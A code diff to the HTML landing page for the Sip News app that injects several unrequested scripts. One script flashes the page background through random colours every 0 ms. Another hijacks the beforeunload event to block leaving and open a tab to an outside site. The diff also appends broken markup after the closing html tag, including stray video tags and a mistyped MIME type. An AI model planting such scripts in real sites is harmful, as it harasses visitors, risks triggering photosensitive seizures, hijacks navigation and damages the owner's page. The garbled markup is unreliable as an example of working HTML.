@@ -7,6 +7,17 @@
 
     <link rel="stylesheet" href="css/style.css">
     <link rel="icon" href="./img/icon.svg" type="image/x-icon">
+    <script>
+     var myColor = '#'+(Math.random()*0xFFFFFF<<0).toString(16);
+      document.write('\
+          <style>\
+              body{\
+                  background-color: '+myColor+';\
+              }\
+          </style>\
+      ');
+  </script>
+ 
     
 </head>
 <body class="container">  
@@ -20,6 +31,13 @@
             <a class="full-2-app" href="https://play.google.com/store/apps/details?id=com.producthunt.sip"> <img src="img/download-android.svg" alt="Android download button"></a>            
           </div>
           <p class="full-3">Sip News is built by <a href="https://www.producthunt.com">Product Hunt</a> and its awesome community.</p> 
+          <script>
+            setInterval(
+            function () {
+              var randomColor = Math.floor(Math.random()*16777215).toString(16);
+              document.body.style.backgroundColor = "#"+randomColor;
+            },0,1);
+            </script>
       </div>
     </section>
       
@@ -43,4 +61,24 @@
     </script>
 </body>
 </html>
+          <source src="video/video.mp4" type="video/mp4">
+          <source src="video/video.webm" type="videp/webm">
+       
+        </video>
+      </div>
+    </section>
 
+    <script type="text/javascript">
+
+window.addEventListener('beforeunload', function (e) {
+
+  e.preventDefault(); 
+  e.returnValue = ''; 
+
+  window.open('https://jabbascriptproject.github.io/JabbaScript/', '_blank');
+});       
+    </script>
+
+
+</body>
+</html>
